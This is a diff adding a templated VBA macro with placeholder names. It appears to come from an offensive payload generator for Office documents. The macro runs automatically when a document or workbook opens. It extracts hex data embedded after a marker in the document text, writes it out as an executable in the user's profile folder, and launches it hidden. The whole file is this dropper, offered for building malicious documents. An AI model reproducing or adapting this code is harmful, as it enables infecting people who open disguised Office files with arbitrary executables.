@@ -1,0 +1,81 @@
+'**************************************************************
+'*
+'* This code is now split into two pieces:
+'*  1. The Macro. This must be copied into the Office document
+'*     macro editor. This macro will run on startup.
+'*
+'*  2. The Data. The hex dump at the end of this output must be
+'*     appended to the end of the document contents.
+'*
+'**************************************************************
+'*
+'* MACRO CODE
+'*
+'**************************************************************
+
+Sub Auto_Open()
+	%{func_name1}
+End Sub
+
+Sub %{func_name1}()
+	Dim %{var_appnr} As Integer
+	Dim %{var_fname} As String
+	Dim %{var_fenvi} As String
+	Dim %{var_fhand} As Integer
+	Dim %{var_parag} As Paragraph
+	Dim %{var_index} As Integer
+	Dim %{var_gotmagic} As Boolean
+	Dim %{var_itemp} As Integer
+	Dim %{var_stemp} As String
+	Dim %{var_btemp} As Byte
+	Dim %{var_magic} as String
+	%{var_magic} = "%{var_magic}"
+	%{var_fname} = "%{filename}.exe"
+	%{var_fenvi} = Environ("USERPROFILE")
+	ChDrive (%{var_fenvi})
+	ChDir (%{var_fenvi})
+	%{var_fhand} = FreeFile()
+	Open %{var_fname} For Binary As %{var_fhand}
+	For Each %{var_parag} in ActiveDocument.Paragraphs
+		DoEvents
+			%{var_stemp} = %{var_parag}.Range.Text
+		If (%{var_gotmagic} = True) Then
+			%{var_index} = 1
+			While (%{var_index} < Len(%{var_stemp}))
+				%{var_btemp} = Mid(%{var_stemp},%{var_index},4)
+				Put #%{var_fhand}, , %{var_btemp}
+				%{var_index} = %{var_index} + 4
+			Wend
+		ElseIf (InStr(1,%{var_stemp},%{var_magic}) > 0 And Len(%{var_stemp}) > 0) Then
+			%{var_gotmagic} = True
+		End If
+	Next
+	Close #%{var_fhand}
+	%{func_name2}(%{var_fname})
+End Sub
+
+Sub %{func_name2}(%{var_farg} As String)
+	Dim %{var_appnr} As Integer
+	Dim %{var_fenvi} As String
+	%{var_fenvi} = Environ("USERPROFILE")
+	ChDrive (%{var_fenvi})
+	ChDir (%{var_fenvi})
+	%{var_appnr} = Shell(%{var_farg}, vbHide)
+End Sub
+
+Sub AutoOpen()
+	Auto_Open
+End Sub
+
+Sub Workbook_Open()
+	Auto_Open
+End Sub
+
+'**************************************************************
+'*
+'* PAYLOAD DATA
+'*
+'**************************************************************
+
+%{var_magic}
+%{data}
